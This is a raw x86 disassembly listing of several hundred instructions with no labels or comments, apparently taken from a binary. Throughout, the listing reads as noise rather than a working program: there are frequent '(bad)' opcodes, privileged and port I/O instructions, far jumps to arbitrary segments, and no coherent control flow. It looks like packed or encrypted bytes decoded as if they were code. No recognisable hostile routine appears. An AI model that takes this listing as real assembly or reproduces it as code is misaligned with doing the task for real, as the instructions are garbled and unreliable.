  416f72:	mov    ecx,0x9b70707e
  416f77:	xchg   esp,eax
  416f78:	add    eax,0xaefdde26
  416f7d:	shl    BYTE PTR [ecx],cl
  416f7f:	and    BYTE PTR [eax],al
  416f81:	jnp    0x416fad
  416f83:	aam    0x8b
  416f85:	dec    ebp
  416f86:	lock push ss
  416f88:	test   eax,0x8ddb9942
  416f8d:	fwait
  416f8e:	cli    
  416f8f:	loope  0x416f46
  416f91:	cmp    al,0x5b
  416f93:	mov    bl,0xd3
  416f95:	mov    ds:0xa674f07e,al
  416f9a:	jle    0x416fac
  416f9c:	int3   
  416f9d:	nop
  416f9e:	jge    0x416f29
  416fa0:	inc    bx
  416fa2:	data16 (bad) 
  416fa4:	out    dx,al
  416fa5:	or     eax,0x6a882ef9
  416faa:	cmp    ah,BYTE PTR [ecx+0x22]
  416fad:	inc    ebx
  416fae:	jl     0x416f66
  416fb0:	push   ebx
  416fb1:	inc    esi
  416fb2:	and    bl,ah
  416fb4:	fstp   QWORD PTR [edx+0x3e]
  416fb7:	sar    eax,0xea
  416fba:	aad    0x36
  416fbc:	xchg   ebp,eax
  416fbd:	jecxz  0x416fad
  416fbf:	int    0xde
  416fc1:	push   0x4fc9b10f
  416fc6:	cmc    
  416fc7:	outs   dx,DWORD PTR ds:[esi]
  416fc8:	repnz sbb edi,DWORD PTR [ecx-0x6f]
  416fcc:	jg     0x41703f
  416fce:	dec    eax
  416fcf:	xchg   ebx,eax
  416fd0:	and    DWORD PTR [esp+edx*4+0x67],0x83480a8d
  416fd8:	mov    DWORD PTR [esi],edi
  416fda:	dec    esp
  416fdb:	dec    edi
  416fdc:	mov    dh,0xea
  416fde:	test   eax,0x12ceeba9
  416fe3:	adc    al,ch
  416fe5:	pop    esp
  416fe6:	pop    esi
  416fe7:	retf   
  416fe8:	enter  0x7c54,0x3d
  416fec:	inc    eax
  416fed:	mov    esp,0xcd37be36
  416ff2:	retf   
  416ff3:	mov    bl,0x92
  416ff5:	adc    esi,DWORD PTR [eax+0x461befde]
  416ffb:	(bad)  
  416ffd:	out    dx,eax
  416ffe:	xchg   edx,eax
  416fff:	leave  
  417000:	inc    edx
  417001:	shl    DWORD PTR [edi],1
  417003:	(bad)  [ecx]
  417005:	int    0x8c
  417007:	adc    BYTE PTR [esp+eax*1],bh
  41700a:	push   eax
  41700b:	mov    ds:0xb1f40387,al
  417010:	push   esp
  417011:	xchg   esp,eax
  417012:	jo     0x417023
  417014:	ror    DWORD PTR [ebx-0x5ed8256d],1
  41701a:	xor    bl,BYTE PTR [ecx-0x2c]
  41701d:	add    ah,BYTE PTR [ebp-0x778ae63]
  417023:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  417025:	in     al,0x17
  417027:	call   0x3d664350
  41702c:	xor    DWORD PTR [ebp-0x728021d5],0x50
  417033:	xchg   ebp,eax
  417034:	out    0x20,eax
  417036:	jae    0x417063
  417038:	scas   eax,DWORD PTR es:[edi]
  417039:	in     al,dx
  41703a:	lock daa 
  41703c:	fcmovbe st,st(7)
  41703e:	and    BYTE PTR [eax-0x42de897],bl
  417044:	adc    DWORD PTR [ebp+0x69e8dae8],0x5319c75b
  41704e:	jnp    0x416ff4
  417050:	dec    esp
  417051:	cli    
  417052:	enter  0x4865,0xe7
  417056:	fs cmp ecx,0x4b
  41705a:	inc    ebp
  41705b:	or     ecx,DWORD PTR [esi-0xdd32f]
  417061:	ret    
  417062:	sub    DWORD PTR [esp+eax*1-0xcf504d3],eax
  417069:	rcl    DWORD PTR [ecx+0x36],0x2
  41706d:	jns    0x417053
  41706f:	adc    BYTE PTR [ebp-0x2b],bl
  417072:	sbb    esi,ebx
  417074:	sahf   
  417075:	xchg   DWORD PTR [ecx],eax
  417077:	leave  
  417078:	push   ecx
  417079:	dec    ebx
  41707a:	fnstsw WORD PTR [ecx]
  41707c:	and    esp,DWORD PTR [eax-0x22324c0e]
  417082:	push   cs
  417083:	add    bh,BYTE PTR [edi]
  417085:	push   es
  417086:	hlt    
  417087:	mov    dl,0xc4
  417089:	pop    es
  41708a:	xlat   BYTE PTR ds:[ebx]
  41708b:	or     eax,0x9cdc45ef
  417090:	jl     0x4170c7
  417092:	and    eax,0x22cf6f84
  417097:	arpl   WORD PTR [ebp+ebx*4+0x2d],sp
  41709b:	mov    esp,es
  41709d:	test   eax,ebp
  41709f:	push   0x826f1638
  4170a4:	ret    
  4170a5:	xor    bl,BYTE PTR [ebx]
  4170a7:	(bad)
  4170ab:	jae    0x417106
  4170ad:	jae    0x41711b
  4170af:	jne    0x41707f
  4170b1:	mov    eax,ds:0x15b0b24d
  4170b6:	push   ds
  4170b7:	fwait
  4170b8:	mov    ecx,0x3a93c953
  4170bd:	sub    DWORD PTR [eax],esp
  4170bf:	add    BYTE PTR [ebp+0x2d],0xbc
  4170c3:	mov    cl,0x80
  4170c5:	inc    esi
  4170c6:	xor    al,0xde
  4170c8:	mov    ?,ecx
  4170ca:	jnp    0x41713a
  4170cc:	sub    BYTE PTR [edx+0x13],0x26
  4170d0:	xchg   ebp,eax
  4170d1:	outs   dx,DWORD PTR ds:[esi]
  4170d2:	or     edx,DWORD PTR [ecx-0x1c80eaf0]
  4170d8:	xchg   ebp,eax
  4170d9:	iret   
  4170da:	(bad)  [edx-0x7c]
  4170dd:	adc    BYTE PTR [edx],0xbf
  4170e0:	test   al,0x52
  4170e2:	out    dx,eax
  4170e3:	mov    ah,0xca
  4170e5:	inc    edx
  4170e6:	sbb    eax,0x766c8457
  4170eb:	in     al,dx
  4170ec:	(bad)  
  4170ed:	mov    ebp,?
  4170ef:	ss imul edx,eax,0x2e
  4170f3:	sti    
  4170f4:	dec    ecx
  4170f5:	enter  0xf1ac,0x24
  4170f9:	add    BYTE PTR [esi],dh
  4170fb:	mov    esi,0xe4bf70d0
  417100:	rcl    ch,0x7a
  417103:	out    dx,eax
  417104:	fwait
  417105:	sqrtps xmm4,XMMWORD PTR [edi-0x6c]
  417109:	pop    edi
  41710a:	(bad)
  41710d:	push   esi
  41710e:	loopne 0x417103
  417110:	aaa    
  417111:	mov    bl,0x19
  417113:	mov    ebp,0x6ab736b6
  417118:	xchg   esi,eax
  417119:	sti    
  41711a:	xlat   BYTE PTR ds:[ebx]
  41711b:	jno    0x417118
  41711d:	cmovb  ebx,DWORD PTR [eax]
  417120:	dec    eax
  417121:	(bad)  
  417122:	jmp    0x4170bb
  417124:	xchg   edx,eax
  417125:	loope  0x417188
  417127:	xor    BYTE PTR [ecx+esi*2],dh
  41712a:	jl     0x41718a
  41712c:	pop    edi
  41712d:	sbb    ch,BYTE PTR [eax+0x25]
  417130:	or     DWORD PTR [eax],edx
  417132:	fsubr  st(2),st
  417134:	fldcw  WORD PTR ds:0x672c35e3
  41713a:	pop    edi
  41713b:	mov    edx,0xeb80e6ec
  417140:	shl    BYTE PTR [edi+0x75],0xca
  417144:	das    
  417145:	adc    eax,0xb646cf27
  41714a:	(bad)  [ecx]
  41714c:	xor    BYTE PTR ds:0x79db02c6,al
  417152:	(bad)  [esi+edi*8]
  417155:	in     al,dx
  417156:	push   esp
  417157:	adc    bh,BYTE PTR [edx]
  417159:	xchg   ebx,eax
  41715a:	daa    
  41715b:	arpl   WORD PTR ds:[ecx+0x3425f060],cx
  417162:	xchg   ebp,eax
  417163:	or     al,0xec
  417165:	je     0x41718e
  417167:	inc    edx
  417168:	mov    ah,0xe2
  41716a:	scas   al,BYTE PTR es:[edi]
  41716b:	stos   BYTE PTR es:[edi],al
  41716c:	sbb    al,0xfd
  41716e:	add    al,0x40
  417170:	jmp    0x78fd:0x47be71c5
  417177:	pop    ecx
  417178:	mov    ds:0x2560e616,eax
  41717d:	fbstp  TBYTE PTR [edx-0x66]
  417180:	rol    DWORD PTR [ebx],0xb7
  417183:	jns    0x4171f3
  417185:	push   ebx
  417186:	dec    BYTE PTR [ebx+eax*4+0x7f]
  41718a:	jbe    0x417119
  41718c:	mov    esp,0x272dbe0c
  417191:	push   es
  417192:	inc    eax
  417193:	in     al,0x88
  417195:	jno    0x417144
  417197:	or     BYTE PTR [eax+0x30],0x84
  41719b:	cmp    DWORD PTR cs:[ebp-0x699a11a0],esi
  4171a2:	mov    ebx,0xb14fd0b6
  4171a7:	dec    ecx
  4171a8:	and    DWORD PTR [eax-0x524bdfcc],eax
  4171ae:	mov    ds:0x8b46f1e5,al
  4171b3:	pop    esi
  4171b4:	mov    dh,BYTE PTR [ecx+0x51bfc39]
  4171ba:	fnstcw WORD PTR [eax-0x631107d1]
  4171c0:	sar    DWORD PTR [esi+esi*2-0x74],0xe5
  4171c5:	xchg   edi,eax
  4171c6:	adc    eax,0x9210b11
  4171cb:	scas   eax,DWORD PTR es:[edi]
  4171cc:	daa    
  4171cd:	jae    0x417227
  4171cf:	push   edi
  4171d0:	pushf  
  4171d1:	add    eax,0xdbdfea89
  4171d6:	jo     0x41723f
  4171d8:	fiadd  DWORD PTR [edx-0x576a3483]
  4171de:	jecxz  0x417204
  4171e0:	push   esp
  4171e1:	out    dx,al
  4171e2:	mov    ch,0x15
  4171e4:	shr    BYTE PTR [ebx-0x69],0x4c
  4171e8:	mov    BYTE PTR ds:[ecx+0x45f02df1],ch
  4171ef:	ins    DWORD PTR es:[edi],dx
  4171f0:	sub    DWORD PTR [ecx],esp
  4171f2:	in     al,0x1d
  4171f4:	mov    eax,ds:0x771fa0e7
  4171f9:	shl    BYTE PTR [esi-0x3573c28b],1
  4171ff:	cmp    ebp,ebp
  417201:	push   0xffffffc0
  417203:	jnp    0x417284
  417205:	pop    edi
  417206:	adc    ebx,ecx
  417208:	aas    
  417209:	sub    cl,dh
  41720b:	inc    edi
  41720c:	div    esi
  41720e:	pop    ss
  41720f:	push   edi
  417210:	mov    eax,ds:0x6f297d46
  417215:	shl    DWORD PTR [edi+0x49],cl
  417218:	outs   dx,DWORD PTR ds:[esi]
  417219:	fnsave [esi-0x63530e36]
  41721f:	inc    ecx
  417220:	rol    DWORD PTR [esi+0x4ae9e5f4],0x29
  417227:	push   ss
  417228:	pop    ebx
  417229:	cmp    DWORD PTR [esi],0x2d2228d0
  41722f:	jo     0x4171d3
  417231:	in     eax,0x50
  417233:	leave  
  417234:	in     eax,0x97
  417236:	call   0xae5f:0xd1c6e73a
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	cmp    eax,DWORD PTR [ecx]
  417256:	xor    al,0xce
  417258:	jo     0x417280
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x8170707e
  417261:	fsub   QWORD PTR [ecx]
  417263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417264:	sub    al,0xf8
  417266:	pushf  
  417267:	push   ss
  417268:	into   
  417269:	sti    
  41726a:	and    ah,cl
  41726c:	dec    eax
  41726d:	add    eax,edx
  41726f:	mov    ch,BYTE PTR [edx-0x45]
  417272:	loop   0x4172df
  417274:	inc    ebp
  417275:	clc    
  417276:	push   es
  417277:	add    dl,bl
  417279:	ja     0x4172ce
  41727b:	jae    0x41724f
  41727d:	gs inc ecx
  41727f:	push   eax
  417280:	repz dec ebp
  417282:	sti    
  417283:	enter  0xf8c3,0x85
  417287:	dec    ecx
  417288:	inc    edx
  417289:	push   ecx
  41728a:	mov    ch,BYTE PTR [edi-0x3a885732]
  417290:	cmc    
  417291:	or     BYTE PTR [edi-0x44c69b53],bl
  417297:	adc    edi,DWORD PTR [edi-0x7b]
  41729a:	jnp    0x41725c
  41729c:	in     eax,dx
  41729d:	fwait
  41729e:	or     ecx,0x40
  4172a1:	push   ss
  4172a2:	stos   DWORD PTR es:[edi],eax
  4172a3:	dec    ebp
  4172a4:	cmp    dl,ch
  4172a6:	loop   0x4172ef
  4172a8:	int    0x2c
  4172aa:	jl     0x4172f6
  4172ac:	mov    esp,0xb03c55cf
  4172b1:	cwde   
  4172b2:	pop    eax
  4172b3:	xor    ch,BYTE PTR [eax-0x19]
  4172b6:	fdivr  QWORD PTR [ebp+0x2c]
  4172b9:	into   
  4172ba:	or     ch,cl
  4172bc:	repz ss add al,0x33
  4172c0:	add    ebp,DWORD PTR [edi]
  4172c2:	mov    ebx,0xe8e208f5
  4172c7:	inc    ebp
  4172c8:	inc    esp
  4172c9:	or     eax,DWORD PTR [ebp-0x33b0d3e7]
  4172cf:	add    eax,0xc6c1738
  4172d4:	cmp    eax,0x9fb18ec8
  4172d9:	mov    dh,0x59
  4172db:	pop    eax
  4172dc:	fimul  DWORD PTR [edi+0x74]
  4172df:	ds (bad) 
  4172e1:	jne    0x41735f
  4172e3:	popf   
  4172e4:	push   ecx
  4172e5:	push   edi
  4172e6:	sub    dl,BYTE PTR [esi+0x7d3d20be]
  4172ec:	call   0x5a4c:0xa1d0cad9
  4172f3:	mov    eax,0xcd9089c7
  4172f8:	push   eax
  4172f9:	mov    ds:0xa2888cb1,eax
  4172fe:	push   cs
  4172ff:	inc    edx
  417300:	xchg   esp,eax
  417301:	lds    ecx,FWORD PTR [edi-0x4d64c61c]
  417307:	inc    ebx
  417308:	loope  0x417366
  41730a:	ret    0x55f8
  41730d:	adc    bl,cl
  41730f:	cs fwait
  417311:	or     DWORD PTR [ecx-0x64],ebx
  417314:	mov    ah,0xb5
  417316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417317:	retf   
  417318:	xchg   BYTE PTR ds:0xbc7758ff,dl
  41731e:	sbb    edi,edx
  417320:	mov    ebx,0x2d19005e
  417325:	je     0x417374
  417327:	arpl   WORD PTR [ebx+ebx*2-0xc],dx
  41732b:	popf   
  41732c:	mov    ebp,0xd5b10fa1
  417331:	jge    0x4172dc
  417333:	mov    esp,0xf51711ca
  417338:	outs   dx,DWORD PTR ds:[esi]
  417339:	pop    ecx
  41733a:	jp     0x417359
  41733c:	dec    esp
  41733d:	js     0x417389
  41733f:	push   eax
  417340:	fcmovnb st,st(5)
  417342:	(bad)  
  417343:	aam    0x18
  417345:	xchg   esp,eax
  417346:	mov    DWORD PTR [eax-0x2983e70f],0xe10173a9
  417350:	loopne 0x41737d
  417352:	mov    ?,esp
  417354:	jmp    0xe13e73da
  417359:	imul   ecx,DWORD PTR [eax+0x5f],0xffffffc3
  41735d:	popa   
  41735e:	inc    esi
  41735f:	ficomp WORD PTR [edx-0x118a0dc8]
  417365:	dec    eax
  417366:	pop    ebx
  417367:	ret    
  417368:	pop    es
  417369:	mov    DWORD PTR [esi+eiz*2],esi
  41736c:	stos   BYTE PTR es:[edi],al
  41736d:	test   eax,0x95bcd577
  417372:	rcl    esi,0x75
  417375:	pop    esi
  417376:	push   edx
  417377:	add    ecx,edx
  417379:	dec    ebx
  41737a:	mov    al,ds:0x2a430e15
  41737f:	fstp   st(2)
  417381:	les    ecx,FWORD PTR [ebp+0x44]
  417384:	push   ss
  417385:	loope  0x4173ed
  417387:	jns    0x41730e
  417389:	jae    0x417346
  41738b:	inc    esp
  41738c:	idiv   DWORD PTR [esi]
  41738e:	and    dl,cl
  417390:	push   0xffffff86
  417392:	mov    al,ds:0xab267d69
  417397:	scas   eax,DWORD PTR es:[edi]
  417398:	pop    edx
  417399:	rcl    DWORD PTR [ecx],cl
  41739b:	sbb    eax,0xd8b296ba
  4173a0:	pop    edx
  4173a1:	and    eax,DWORD PTR [edx+0x78]
  4173a4:	(bad)  
  4173a5:	pop    di
  4173a7:	push   ecx
  4173a8:	int3   
  4173a9:	(bad)  
  4173aa:	js     0x417395
  4173ac:	rol    DWORD PTR [ebp-0x6c9fedfa],1
  4173b2:	jg     0x4173f6
  4173b4:	pop    ss
  4173b5:	mov    al,bh
  4173b7:	and    esp,esp
  4173b9:	xchg   eax,ebp
  4173bb:	mov    ch,0x97
  4173bd:	imul   BYTE PTR [ecx]
  4173bf:	cwde   
  4173c0:	(bad)  
  4173c1:	mov    ds:0x204ce0df,eax
  4173c6:	cmc    
  4173c7:	jl     0x417352
  4173c9:	sub    eax,0xb40e483f
  4173ce:	aam    0xf1
  4173d0:	mov    dh,0xfb
  4173d2:	jae    0x4173e3
  4173d4:	cmp    eax,0xb224ea34
  4173d9:	mov    al,0x7f
  4173db:	lea    edx,[edi]
  4173dd:	mov    al,ds:0xddfa25e
  4173e2:	fisub  DWORD PTR [ebp-0xc2dbb86]
  4173e8:	xchg   esp,eax
  4173e9:	dec    ecx
  4173ea:	(bad)  
  4173eb:	cmc    
  4173ec:	psrld  mm4,QWORD PTR [edi]
  4173ef:	jnp    0x4173f8
  4173f1:	dec    eax
  4173f2:	daa    
  4173f3:	sub    al,0xff
  4173f5:	test   DWORD PTR [eax-0x4b],edx
  4173f8:	js     0x41740c
  4173fa:	push   ecx
  4173fb:	cmp    cl,BYTE PTR [ebp+0x14]
  4173fe:	sti    
  4173ff:	iret   
  417400:	sub    eax,0x26c705ed
  417405:	test   edx,ebp
  417407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417408:	inc    edi
  417409:	aad    0x4b
  41740b:	dec    edx
  41740c:	retf   
  41740d:	idiv   ch
  41740f:	xor    ecx,esi
  417411:	jne    0x417397
  417413:	dec    edx
  417414:	ficom  DWORD PTR [edi+0x1]
  417417:	and    DWORD PTR [edx+0x25],ebx
  41741a:	jb     0x41740e
  41741c:	int3   
  41741d:	jmp    0x417486
  41741f:	mov    al,ds:0x45f0dd3e
  417424:	jns    0x417472
  417426:	push   ebx
  417427:	and    BYTE PTR [esi+0x620c7c85],dh
  41742d:	inc    edx
  41742e:	jns    0x4174a0
  417430:	sbb    al,0x83
  417432:	cmp    DWORD PTR [ecx],ebx
  417434:	lods   eax,DWORD PTR ds:[esi]
  417435:	retf   0xf2f6
  417438:	in     eax,0xf9
  41743a:	push   eax
  41743b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41743c:	pushf  
  41743d:	cld    
  41743e:	ficomp WORD PTR [esi+0x5153a485]
  417444:	lds    esp,FWORD PTR [esi+0x56613e]
  41744a:	inc    esp
  41744b:	dec    esi
  41744c:	jnp    0x417452
  41744e:	test   eax,0x825fdd67
  417453:	cmp    BYTE PTR [esi-0x3e05ef1d],ah
  417459:	lahf   
  41745a:	mov    al,ds:0x228f00a7
  41745f:	mov    esp,0xc4abc4fb
  417464:	adc    DWORD PTR [ebp+0x76],ebx
  417467:	push   esi
  417468:	in     al,0xb2
  41746a:	push   ebx
  41746b:	xor    ebp,ecx
  41746d:	bound  ebx,QWORD PTR [esi-0x230b91f4]
  417473:	and    BYTE PTR [ebx+0x71],0x6c
  417477:	in     eax,0x72
  417479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41747a:	sbb    esp,esp
  41747c:	jbe    0x417480
  41747e:	int3   
  41747f:	and    BYTE PTR [edi-0x45c673d8],cl
  417485:	outs   dx,BYTE PTR ds:[esi]
  417486:	pop    ecx
  417487:	nop
  417488:	lds    ebx,FWORD PTR [ebx]
  41748a:	test   al,0x1e
  41748c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41748d:	ds pop ebp
  41748f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417490:	lds    ebp,FWORD PTR [edx]
  417492:	xor    DWORD PTR [edx-0x1c856a23],ecx
  417498:	out    dx,al
  417499:	in     al,dx
  41749a:	mov    ds,WORD PTR [esi]
  41749c:	les    eax,FWORD PTR [ecx+0x2665bb8]
  4174a2:	retf   
  4174a3:	mov    esi,esi
  4174a5:	pusha  
  4174a6:	lock stos DWORD PTR es:[edi],eax
  4174a8:	jno    0x417479
  4174aa:	cwde   
  4174ab:	sub    DWORD PTR [ecx-0x6f72d563],ebx
  4174b1:	or     BYTE PTR [ebp+0x2828c76],dh
  4174b7:	out    dx,eax
  4174b8:	xor    edx,edi
  4174ba:	sub    BYTE PTR [esi-0x59ae893],bh
  4174c0:	dec    esp
  4174c1:	inc    ebx
  4174c2:	xor    ah,BYTE PTR [edi]
  4174c4:	pop    esi
  4174c5:	mov    ch,0x3d
  4174c7:	sbb    esi,DWORD PTR [eax+0x1a]
  4174ca:	mov    BYTE PTR [edi-0x29babff8],dl
  4174d0:	lea    ebx,[edi+0xd71cd2]
  4174d6:	xor    BYTE PTR gs:[esi],0xf3
  4174da:	icebp  
  4174db:	loope  0x417508
  4174dd:	pop    ebx
  4174de:	inc    ecx
  4174df:	out    dx,eax
  4174e0:	adc    BYTE PTR [edi+eax*1],ah
  4174e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174e4:	inc    ebx
  4174e5:	mov    al,ds:0x452f8c38
  4174ea:	add    DWORD PTR [ecx],0x8deac8c3
  4174f0:	mov    edx,0x12193d34
  4174f5:	pushf  
  4174f6:	dec    eax
  4174f7:	inc    ebx
  4174f8:	add    ebp,ebp
  4174fa:	jg     0x417488
  4174fc:	push   ebp
  4174fd:	pop    edx
  4174fe:	ret    
  4174ff:	push   ebp
  417500:	mov    edx,0xca4c1885
  417505:	xlat   BYTE PTR ds:[ebx]
  417506:	inc    eax
  417507:	out    dx,al
  417508:	and    eax,0x60222525
  41750d:	cmp    al,0xa8
  41750f:	(bad)  
  417510:	out    dx,al
  417511:	push   esi
  417512:	aaa    
  417513:	pop    ebp
  417514:	xor    al,0xa9
  417516:	or     al,0xb2
  417518:	or     eax,0x22a5c58c
  41751d:	push   cs
  41751e:	(bad)  
  41751f:	aas    
  417520:	idiv   BYTE PTR [edi]
  417522:	jmp    DWORD PTR [esi+0x3315659e]
  417528:	rol    BYTE PTR [ecx],cl
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [ebx-0x4b],edi
  417544:	mov    dh,BYTE PTR [ecx+edi*4+0x24]
  417548:	jg     0x4175ba
  41754a:	mov    ecx,0x9e70707e
  41754f:	icebp  
  417550:	imul   ebp,DWORD PTR [ecx-0x35e9e11c],0xffffffeb
  417557:	adc    bl,BYTE PTR [esi]
  417559:	arpl   WORD PTR [edx],si
  41755b:	lock (bad) 
  41755d:	fs jmp 0x91c5:0x20c91787
  417565:	(bad)  
  417566:	xlat   BYTE PTR ds:[ebx]
  417567:	fs or  eax,0xfed3fe21
  41756d:	cmp    BYTE PTR [eax-0x54],dh
  417570:	xchg   esi,eax
  417571:	in     eax,0xd9
  417573:	shl    BYTE PTR [ecx-0x759d0250],cl
  417579:	sbb    ah,BYTE PTR [ecx+0x629a8888]
  41757f:	lahf   
  417580:	pop    eax
  417581:	and    ch,BYTE PTR gs:[edi]
  417584:	inc    ebp
  417585:	jp     0x4175ca
  417587:	push   ss
  417588:	mov    ds:0x217ed117,eax
  41758d:	mov    ah,0xb7
  41758f:	pop    ebp
  417590:	jne    0x41754c
  417592:	adc    BYTE PTR [ebx-0x23929131],0xa2
  417599:	loope  0x417533
  41759b:	mov    cl,0x6
  41759d:	cdq    
  41759e:	fld    DWORD PTR [edx]
  4175a0:	pusha  
  4175a1:	jp     0x417570
  4175a3:	mov    dh,ah
  4175a5:	add    al,0x4b
  4175a7:	pop    es
  4175a8:	push   ds
  4175a9:	jmp    0x417608
  4175ab:	and    dl,BYTE PTR [esi+0x22e19cd]
  4175b1:	pop    ebp
  4175b2:	jne    0x4175db
  4175b4:	repnz sti 
  4175b6:	imul   bh
  4175b8:	ja     0x41757f
  4175ba:	push   ebp
  4175bb:	push   0x521431f1
  4175c0:	out    0x46,eax
  4175c2:	jecxz  0x41759b
  4175c4:	pop    esp
  4175c5:	xchg   ebp,eax
  4175c6:	sbb    al,BYTE PTR [edx-0x41]
  4175c9:	adc    ch,BYTE PTR [esp+eax*4+0x71db0e8c]
  4175d0:	add    al,0xc8
  4175d2:	pop    ss
  4175d3:	fisubr WORD PTR [esi-0x57cebf7f]
  4175d9:	adc    al,0x9f
  4175db:	pushf  
  4175dc:	ins    DWORD PTR es:[edi],dx
  4175dd:	xchg   BYTE PTR [esi-0x3],bl
  4175e0:	ds (bad) 
  4175e2:	pop    DWORD PTR [eax+0x72bfaf45]
  4175e8:	add    DWORD PTR [edx],ebx
  4175ea:	loope  0x4175e9
  4175ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175ed:	cdq    
  4175ee:	sbb    cl,BYTE PTR [esi]
  4175f0:	scas   al,BYTE PTR es:[edi]
  4175f1:	ror    DWORD PTR [ebp-0x78a8eac0],0xab
  4175f8:	shl    dl,0x49
  4175fb:	xlat   BYTE PTR ds:[ebx]
  4175fc:	fisttp WORD PTR [eax]
  4175fe:	xchg   esp,eax
  4175ff:	repnz popa 
  417601:	aam    0x7b
  417603:	daa    
  417604:	inc    ecx
  417605:	lock mov esi,0x6b9c66e8
  41760b:	jb     0x417602
  41760d:	in     eax,dx
  41760e:	mov    ds:0x8c449e5c,al
  417613:	repnz add edi,esp
  417616:	push   cs
  417617:	push   ds
  417618:	popf   
  417619:	jge    0x4175a2
  41761b:	sub    BYTE PTR [eax+0x6a451b],0x4f
  417622:	cmp    edi,ebp
  417624:	leave  
  417625:	xor    BYTE PTR [ebp-0x1c360927],cl
  41762b:	pusha  
  41762c:	add    DWORD PTR [edx-0x7cceb40],edx
  417632:	iret   
  417633:	sbb    eax,0x100074
  417638:	call   0x6acb:0xfa34d2
  41763f:	fistp  WORD PTR [ecx+0x7697f178]
  417645:	cmc    
  417646:	sbb    BYTE PTR fs:[edi+0x4],bl
  41764a:	jb     0x417632
  41764c:	fdivrp st(6),st
  41764e:	(bad)  
  41764f:	sbb    eax,0xb5a5165c
  417654:	mov    edx,DWORD PTR [eax+0x43]
  417657:	int3   
  417658:	and    ebx,ecx
  41765a:	cli    
  41765b:	pop    edx
  41765c:	mov    edx,0xa50d7b33
  417661:	test   eax,0x73823a46
  417666:	cmp    eax,0x26533f0d
  41766b:	dec    ebx
  41766c:	mov    fs,WORD PTR [edi-0x5a9bc965]
  417672:	sbb    al,0xca
  417674:	aaa    
  417675:	mov    edx,0xa424cd30
  41767a:	rol    BYTE PTR [eax],cl
  41767c:	inc    DWORD PTR [edx+0x78]
  41767f:	adc    eax,0xcd311fdf
  417684:	(bad)
  417687:	pop    edi
  417688:	sub    BYTE PTR [ebp-0x1f40b02c],cl
  41768e:	aas    
  41768f:	popw   es
  417691:	call   0x652078d8
  417696:	ret    
  417697:	inc    edx
  417698:	add    DWORD PTR [edi+0x2efe24a],0xffffff8b
  41769f:	inc    edx
  4176a0:	jge    0x4176f2
  4176a2:	punpckhdq mm6,QWORD PTR [esp+edx*1-0x3]
  4176a7:	fistp  DWORD PTR [ecx+0x75]
  4176aa:	pop    ss
  4176ab:	ror    BYTE PTR [edi],cl
  4176ad:	inc    edx
  4176ae:	mov    ch,0x9a
  4176b0:	imul   edi,DWORD PTR [edx+0x1f19283c],0x49
  4176b7:	sbb    DWORD PTR [ecx+0x76],0x6ab53610
  4176be:	jae    0x41767c
  4176c0:	aad    0x4a
  4176c2:	jp     0x41767b
  4176c4:	cdq    
  4176c5:	mov    WORD PTR [esi+ebp*2+0x4fb3eda7],?
  4176cc:	mov    bl,BYTE PTR [ecx-0x27eefdfa]
  4176d2:	loop   0x4176b4
  4176d4:	loopne 0x41774f
  4176d6:	mov    ah,0x82
  4176d8:	dec    DWORD PTR [edx+0x7b]
  4176db:	mov    ecx,0xaf45236d
  4176e0:	add    bh,BYTE PTR [edi-0x20]
  4176e3:	es and ch,bh
  4176e6:	add    ah,bh
  4176e8:	cmp    eax,0xa374af68
  4176ed:	jge    0x41775e
  4176ef:	jp     0x417701
  4176f1:	xchg   ecx,eax
  4176f2:	ret    0xaff9
  4176f5:	cmp    al,0x3
  4176f7:	xor    cl,dh
  4176f9:	xchg   DWORD PTR [ebp+0x13f88f34],ecx
  4176ff:	add    DWORD PTR [ecx-0x5cec991b],0xffffffea
  417706:	iret   
  417707:	jno    0x41772b
  417709:	or     eax,0x4d03bb8a
  41770e:	aaa    
  41770f:	hlt    
  417710:	mov    eax,ds:0xeb785596
  417715:	push   cs
  417716:	sub    esp,0x33
  417719:	inc    eax
  41771a:	test   BYTE PTR [esi+0x7],0xe
  41771e:	(bad)  
  41771f:	pop    esp
  417720:	je     0x41773c
  417722:	cdq    
  417723:	add    BYTE PTR [ecx-0x46],cl
  417726:	and    esi,DWORD PTR [eax+0x63b18a72]
  41772c:	cld    
  41772d:	ret    0x2a11
  417730:	dec    ecx
  417731:	inc    eax
  417732:	mov    dh,BYTE PTR [ebx+0x1ce539b5]
  417738:	mov    bl,bl
  41773a:	inc    ecx
  41773b:	jmp    0xe10436bf
  417740:	pop    esi
  417741:	jns    0x4176cf
  417743:	and    DWORD PTR [ebx+0x16],edx
  417746:	jb     0x41772e
  417748:	and    bl,BYTE PTR ds:0x4e38d5e7
  41774e:	ss (bad) 
  417750:	sbb    dh,bl
  417752:	or     ch,BYTE PTR [esi+ebp*8+0x27]
  417756:	stos   DWORD PTR es:[edi],eax
  417757:	add    cl,BYTE PTR [esi]
  417759:	scas   al,BYTE PTR es:[edi]
  41775a:	push   edi
  41775b:	mov    al,0x20
  41775d:	lds    ecx,FWORD PTR [esi-0x291872a5]
  417763:	repz sub ecx,ecx
  417766:	js     0x4177c8
  417768:	inc    esp
  417769:	xchg   esp,eax
  41776a:	cli    
